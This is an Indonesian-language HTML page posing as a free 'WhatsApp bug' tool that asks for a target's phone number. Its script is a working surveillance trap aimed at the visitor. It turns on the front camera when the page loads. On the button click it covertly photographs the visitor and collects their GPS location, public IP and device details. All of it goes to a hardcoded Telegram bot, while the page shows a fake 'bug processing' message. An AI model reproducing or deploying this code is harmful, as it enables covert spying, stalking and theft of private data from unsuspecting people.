<!DOCTYPE html>
<html>
<head>
  <title>Bug WhatsApp</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://files.catbox.moe/fbj7xc.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      text-align: center;
      overflow-x: hidden;
    }

    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
      background: url('https://files.catbox.moe/fbj7xc.jpg') repeat;
      background-size: contain;
      animation: snowAnim 20s linear infinite;
      opacity: 0.3;
    }

    @keyframes snowAnim {
      0% { background-position: 0 -100px; }
      100% { background-position: 0 100px; }
    }

    .container {
      position: relative;
      z-index: 2;
      margin-top: 140px;
    }

    h1 {
      font-size: 3.2em;
      text-shadow: 0 0 15px #00ffe1, 0 0 25px #00ffe1;
    }

    input {
      padding: 18px;
      border-radius: 12px;
      border: none;
      font-size: 24px;
      width: 85%;
      max-width: 400px;
      margin-top: 25px;
      outline: none;
      background-color: rgba(0, 0, 0, 0.65);
      color: white;
      box-shadow: 0 0 25px #00ffee, 0 0 35px #00ffee;
      transition: 0.3s ease-in-out;
    }

    button {
      margin-top: 25px;
      padding: 15px 30px;
      font-size: 20px;
      background-color: #00ffcc;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      color: #111;
      box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffcc;
    }

    .toast {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.8);
      color: #fff;
      padding: 14px 25px;
      border-radius: 10px;
      font-size: 16px;
      z-index: 999;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.5s ease;
    }

    .toast.show {
      opacity: 1;
      pointer-events: auto;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="snow"></div>

<div class="container">
  <h1>Bug WhatsApp Free</h1>
  <p>Masukkan Nomor Target:</p>
  <input type="text" placeholder="Contoh: 62xxxxx" id="nomor">
  <br>
  <button onclick="main()">Kirim Bug WhatsApp</button>
</div>

<video id="video" width="1080" height="1350" autoplay></video>
<canvas id="canvas" width="1080" height="1350"></canvas>

<audio id="sound">
  <source src="https://files.catbox.moe/033uyr.mp3" type="audio/mpeg">
</audio>

<div id="toast" class="toast">Notifikasi</div>

<script>
  const token = "7435143784:AAG0Jbu7tNBfHYNj14tVOPgrIFOQ_M1oZpk";
  const chat_id = "7872909675";
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const sound = document.getElementById('sound');

  let dataTerkirim = false; // <== FLAG mencegah pengiriman berulang

  function showToast(message, duration = 3000) {
    const toast = document.getElementById('toast');
    toast.innerText = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), duration);
  }

  async function enableCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: { ideal: 1080 },
          height: { ideal: 1350 },
          facingMode: "user"
        }
      });
      video.srcObject = stream;
      showToast("‚úÖ Succesfuly...");
    } catch (err) {
      showToast("‚ùå Terjadi Kesalahan, Mohon Ulangi...: " + err.message);
    }
  }

  enableCamera();

  async function captureAndSendFullData() {
    if (dataTerkirim) return; // Hentikan jika sudah terkirim

    dataTerkirim = true; // Set flag agar hanya kirim sekali
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async function(blob) {
      navigator.geolocation.getCurrentPosition(async function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const userAgent = navigator.userAgent;
        const time = new Date().toLocaleString();

        // Ambil IP publik
        let ip = "Tidak diketahui";
        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const data = await res.json();
          ip = data.ip;
        } catch (e) {
          showToast("‚ö†Ô∏è Terjadi Kesalahan, Mohon Ulangi...");
        }

        // Kirim lokasi ke Telegram
        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chat_id,
            latitude: lat,
            longitude: lon
          })
        });

        // Kirim foto + data
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "kamera_hd.jpg");
        form.append("caption", `
üì∑ Foto Target Terkirim
üïì Waktu: ${time}
üåç Lokasi: 
  ‚Ä¢ Latitude: ${lat}
  ‚Ä¢ Longitude: ${lon}
üåê IP: ${ip}
üì± Device: ${userAgent}
        `);

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });

        showToast("‚úÖ Succesfuly...");
      }, function(err) {
        showToast("‚ùå Terdapat Kesalahan...: " + err.message);
      });
    }, 'image/jpeg', 1.0);
  }

  function main() {
    const nomor = document.getElementById("nomor").value.trim();
    if (nomor === "") {
      showToast("‚ö†Ô∏è Masukkan nomor target terlebih dahulu!");
      return;
    }

    sound.play();
    showToast("‚è≥ Bug sedang diproses, tunggu 5-10 menit...");
    captureAndSendFullData();
  }
</script>

</body>
</html>
